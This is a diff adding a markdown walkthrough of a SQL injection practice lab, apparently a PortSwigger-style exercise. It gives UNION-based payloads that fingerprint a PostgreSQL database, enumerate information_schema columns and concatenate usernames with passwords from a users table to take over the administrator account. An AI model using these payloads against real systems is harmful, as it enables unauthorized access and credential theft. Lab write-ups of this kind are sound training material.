@@ -233,3 +233,47 @@ List out all username and password from `users_nflxix`.
 ' UNION SELECT username_deyvdc,password_bebcvo FROM users_nflxix-- 
 ```
 <img width="1384" height="706" alt="image" src="https://github.com/user-attachments/assets/c2ec2185-7a5f-4c1e-b0d9-9747ec86d626" />
+
+### Lab 06: SQL injection UNION attack, retrieving multiple values in a single column
+
+> The database contains a different table called users, with columns called username and password.
+>
+> Goal: Retrieves all usernames and passwords, and use the information to log in as the administrator user. 
+
+#### Recon
+I tried to see what DB that we are handling with. Enumerate syntax for all DB and found out that the DB is PostgreSQL. 
+```
+' UNION SELECT '1',version()--
+```
+<img width="1407" height="628" alt="image" src="https://github.com/user-attachments/assets/2ecabf37-6449-41e4-8f9d-5bb02395c53e" />
+
+The reason I didnt use the first column to display DB version is because the data type is integer. The input I gave in first column will be included for `productID`.
+```
+<td>
+  <a class="button is-small" href="/product?productId=1">View details</a>
+</td>
+```
+
+Hence why if I put a string or `version()`, it will return error since there is no product with a string as `productID`.
+
+<img width="1390" height="310" alt="image" src="https://github.com/user-attachments/assets/ae99bfb2-8a24-40fb-bd36-9172dd2e7e2d" />
+
+#### Exploitation
+List out all tables and find `users` table.
+
+<img width="1387" height="561" alt="image" src="https://github.com/user-attachments/assets/f1f5a4a8-cb2c-4a4e-adaf-b0ebd42f5832" />
+
+List out all columns inside `users` table.
+```
+' UNION SELECT 1,column_name from information_schema.columns where table_name='users'--
+```
+<img width="1372" height="580" alt="image" src="https://github.com/user-attachments/assets/4ed32095-3d7c-44f5-a448-4f35ff4be89c" />
+
+We only have one column that can return string but we need to list out both username and password. It is possible to list those columns seperately but it will be difficult to differentiate which passowrd belongs to which user. So, we can include both columns output into one column only.
+
+Use `||` to concatenate 2 strings, and you can use any delimiter to distinguish username and password.
+```
+' UNION SELECT 1,username||'~'||password from users--
+```
+<img width="1387" height="718" alt="image" src="https://github.com/user-attachments/assets/f7222dcd-d1ee-48ee-906b-30a440cd8275" />
+
